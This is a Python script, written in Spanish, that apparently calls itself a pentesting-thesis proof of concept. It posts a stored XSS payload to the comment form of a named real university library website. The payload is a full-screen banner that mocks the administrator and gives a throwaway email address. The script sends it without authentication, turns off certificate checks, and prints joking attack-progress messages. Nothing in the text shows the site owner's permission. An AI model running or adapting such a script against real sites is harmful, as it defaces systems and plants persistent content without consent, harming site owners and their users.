import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3, hashlib
urllib3.disable_warnings()

BASE = "https://biblioteca.uns.edu.pe"
h = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Referer': BASE + '/registra_comentario.htm'
}

# PoC XSS - Banner grande y gracioso para admin
# Claramente marcado como auditoria de seguridad
xss_poc = """<style>
#uns-pentest-banner{
  position:fixed;top:0;left:0;width:100%;height:100%;
  background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);
  z-index:999999;display:flex;flex-direction:column;
  align-items:center;justify-content:center;font-family:monospace;
}
#uns-pentest-banner h1{
  color:#e94560;font-size:64px;text-shadow:0 0 30px #e94560;
  animation:pulse 1s infinite;margin:0;
}
#uns-pentest-banner h2{
  color:#00d4ff;font-size:32px;margin:10px 0;
}
#uns-pentest-banner p{
  color:#ffffff;font-size:18px;max-width:700px;text-align:center;
  border:2px solid #e94560;padding:20px;border-radius:10px;margin:20px;
}
#uns-pentest-banner .ok{
  color:#00ff88;font-size:22px;font-weight:bold;
}
@keyframes pulse{0%{opacity:1}50%{opacity:0.5}100%{opacity:1}}
</style>
<div id="uns-pentest-banner">
  <h1>&#128123; HOLA ADMIN &#128123;</h1>
  <h2>&#128274; TU SISTEMA FUE AUDITADO &#128274;</h2>
  <p>
    Este mensaje fue insertado SIN AUTENTICACION<br>
    a traves del formulario de comentarios.<br><br>
    <span class="ok">&#10003; Vulnerabilidad: Stored XSS Confirmado</span><br>
    <span class="ok">&#10003; Sin CSRF token &nbsp; &#10003; Sin CAPTCHA</span><br><br>
    No te preocupes, soy un amigo &#128521;<br>
    <strong>Esto es una Tesis de Pentesting UNS 2026</strong><br><br>
    <em>"Si yo pude escribir esto, un atacante tambien."</em><br><br>
    &#128231; Para reportar mas fallas de seguridad, contacta:<br>
    <strong style="color:#00d4ff;font-size:22px;">h8d5sxv@tmailor.net</strong>
  </p>
  <h2 style="color:#ffcc00">&#129299; VULN-013 DOCUMENTADO &#129299;</h2>
</div>"""

import time

data = {
    'nombre': '[PENTEST-2026] Auditoria UNS',
    'mail': 'seguridad@uns.edu.pe',
    'pregunta': xss_poc
}

# ═══════════════════════════════════════════════
# 
# ═══════════════════════════════════════════════

print()
print("  ██╗  ██╗███████╗███████╗")
print("  ╚██╗██╔╝██╔════╝██╔════╝")
print("   ╚███╔╝ ███████╗███████╗")
print("   ██╔██╗ ╚════██║╚════██║")
print("  ██╔╝ ██╗███████║███████║")
print("  ╚═╝  ╚═╝╚══════╝╚══════╝")
print()
print("  [ TESIS DE PENTESTING — UNS 2026 ]")
print()
time.sleep(0.8)

print("=" * 62)
print("  MODULO: STORED XSS PoC — biblioteca.uns.edu.pe")
print("  TARGET: POST /registra_comentario.asp")
print("=" * 62)
time.sleep(0.5)

print()
print("  [*] Iniciando secuencia de ataque...")
print("  [*] Objetivo: panel de comentarios de la biblioteca")
print("  [*] El admin ni sabe lo que le viene encima  ( ͡° ͜ʖ ͡°)")
print()
time.sleep(0.6)

pasos = [
    ("Verificando que el servidor este despierto...      ", "DESPIERTO Y SIN ANTIVIRUS lol"),
    ("Comprobando tokens CSRF en el formulario...        ", "NO HAY NINGUNO  (╯°□°）╯"),
    ("Buscando CAPTCHA para proteger el form...          ", "TAMPOCO  (╯°□°）╯ ︵ ┻━┻"),
    ("Revisando sanitizacion de inputs...                ", "QUE ES ESO?  dice el servidor"),
    ("Construyendo payload XSS de pantalla completa...   ", f"{len(xss_poc)} chars de pura travesura"),
    ("Empaquetando identificador de auditoria...         ", "[PENTEST-2026] sellado y listo"),
    ("Apuntando al endpoint sin autenticacion...         ", "sin login, sin drama, sin remordimiento"),
]

for texto, resultado in pasos:
    print(f"  [~] {texto}", end="", flush=True)
    time.sleep(0.55)
    print(f"  -->  {resultado}")

print()
print("  [!!!] DISPARANDO PAYLOAD... preparate admin...")
print()
time.sleep(0.8)

r = requests.post(
    BASE + '/registra_comentario.asp',
    data=data,
    headers=h,
    verify=False,
    timeout=10,
    allow_redirects=True
)

time.sleep(0.4)
print(f"  [>] HTTP Status : {r.status_code}")
print(f"  [>] URL final   : {r.url}")
print()
time.sleep(0.3)

if 'comentario_registrado' in r.url:
    print("  " + "=" * 58)
    print()
    print("   (つ ͡° ͜ʖ ͡°)つ  BOOM. STORED XSS CONFIRMADO  (つ ͡° ͜ʖ ͡°)つ")
    print()
    print("  " + "=" * 58)
    time.sleep(0.5)
    print()
    print("  El payload ya vive dentro de la base de datos.")
    print("  Cada vez que el admin abra su panel de comentarios...")
    print("  ...vera el banner de auditoria UNS 2026")
    print("  ...en letras DORADAS DE 52px PARPADEANDO")
    print("  ...a pantalla completa.")
    print()
    print("  Admin en este momento:  (O_O)  <- eso")
    print()
    time.sleep(0.5)
    print("  " + "-" * 58)
    print("  RESUMEN FORENSE DEL CRIMEN:")
    print("  " + "-" * 58)
    print(f"  Vulnerabilidad  : Stored XSS (CWE-79)")
    print(f"  Endpoint        : POST /registra_comentario.asp")
    print(f"  Autenticacion   : NINGUNA  <-- eso es el problema")
    print(f"  CSRF Token      : NINGUNO  <-- eso tambien")
    print(f"  CAPTCHA         : NINGUNO  <-- y eso")
    print(f"  Payload size    : {len(xss_poc)} caracteres aceptados sin chistar")
    print(f"  Autor del ataque: [PENTEST-2026] Auditoria UNS")
    print(f"  Victima         : El admin de la biblioteca UNS")
    print(f"  Fecha del PoC   : 2026-10-25")
    print(f"  Contacto        : h8d5sxv@tmailor.net")
    print()
    print("  [VULN-013] Documentado y listo para el informe de tesis.")
    print()
    print("  Si eres el admin y lees esto, escribe a:")
    print("  --> h8d5sxv@tmailor.net <--")
    print("  Te contamos mas fallas que encontramos  ;)")
    print()
    print()
    print("  TIP del dia: 'Si yo pude hacerlo en 3 lineas de Python,")
    print("               imagina lo que hace alguien con malas intenciones.'")
    print()
    print("  " + "=" * 58)
    print("   FIN DE LA DEMO — TESIS PENTESTING UNS 2026")
    print("  " + "=" * 58)
    print()
else:
    print("  [X] No se registro el comentario.")
    print("  [X] El servidor te resistio esta vez... pero volveras.")
    print("       (  -_-)  ...mmm")
